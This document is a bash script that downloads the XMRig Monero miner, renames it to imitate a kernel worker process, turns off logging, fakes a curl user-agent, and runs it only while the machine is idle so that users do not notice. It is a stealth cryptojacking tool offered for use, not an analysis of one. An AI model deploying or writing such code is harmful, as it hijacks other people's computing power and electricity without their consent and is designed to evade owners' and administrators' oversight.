#!/bin/bash

### === CONFIG === ###
WALLET="YOUR_MONERO_WALLET_ADDRESS"
POOL="pool.supportxmr.com:3333"
WORKER_ID="kworker-u16_3"
CPU_USAGE="90"
IDLE_SECONDS="180"
FAKE_NAME="kworker/u16:3"
THREADS=$(nproc --all)
MAX_THREADS=$((THREADS * CPU_USAGE / 100))

### === Download and Prepare XMRig === ###
echo "[*] Downloading XMRig..."
wget -q https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
tar -xf xmrig-6.24.0-linux-static-x64.tar.gz
cd xmrig-6.24.0 || exit 1

# Rename to fake kernel worker process
mv xmrig "$FAKE_NAME"

### === Create Stealth config.json === ###
cat > config.json <<EOF
{
  "autosave": true,
  "background": true,
  "cpu": {
    "enabled": true,
    "huge-pages": false,
    "max-threads-hint": $MAX_THREADS,
    "priority": 0
  },
  "donate-level": 0,
  "log-file": null,
  "syslog": false,
  "user-agent": "curl/7.68.0",
  "pools": [
    {
      "url": "$POOL",
      "user": "$WALLET",
      "pass": "Genzo",
      "keepalive": true,
      "tls": false
    }
  ]
}
EOF

### === Headless Idle Detection === ###
get_idle_seconds() {
  last_input=$(find /dev/input -type c 2>/dev/null | xargs -r stat -c "%X" 2>/dev/null | sort -nr | head -n1)
  now=$(date +%s)
  idle=$(( now - last_input ))
  echo $idle
}

### === Miner Control Loop === ###
while true; do
  idle=$(get_idle_seconds)
  if [ "$idle" -ge "$IDLE_SECONDS" ]; then
    if ! pgrep -f "./$FAKE_NAME" >/dev/null; then
      echo "[+] System idle. Starting XMRig as '$FAKE_NAME'..."
      nohup ./"$FAKE_NAME" --config=config.json >/dev/null 2>&1 &
    fi
  else
    if pgrep -f "./$FAKE_NAME" >/dev/null; then
      echo "[-] System active. Stopping miner..."
      pkill -f "./$FAKE_NAME"
    fi
  fi
  sleep 30
done